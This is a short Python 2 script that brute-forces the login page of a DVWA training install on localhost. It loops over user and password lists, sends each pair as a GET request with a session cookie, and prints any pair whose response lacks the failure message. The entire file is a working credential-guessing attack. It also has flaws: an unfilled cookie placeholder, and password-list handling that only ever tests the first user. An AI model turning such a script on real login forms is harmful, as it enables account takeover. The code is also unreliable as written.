#!/usr/bin/python
import requests,sys,urllib
#dvwa brute-force

if len(sys.argv) != 3:
	print 'usage: bf_http user_list password_list'
	exit(0)

header = {YOUR_COOKIE}
a = sys.argv[1]
b = sys.argv[2]
users = open(a,'r')
pas = open(b,'r')
find = False
print 'running...'

for i in users.readlines():
	i = i.strip('\n')
	for j in pas.readlines():
		j = j.strip('\n')
		ip = 'http://localhost/DVWA-master/vulnerabilities/brute/?username='+i+'&password='+urllib.quote(j)+'&Login=Login#'
		r = requests.get(ip,headers=header).content
 		if not 'Username and/or password incorrect.' in r:
			print '[+] user/password found %s:%s'%(i,j)
			users.seek(0)
			pas.seek(0)
			find = True
			break

if not find:
	print '[-] user/password not found'


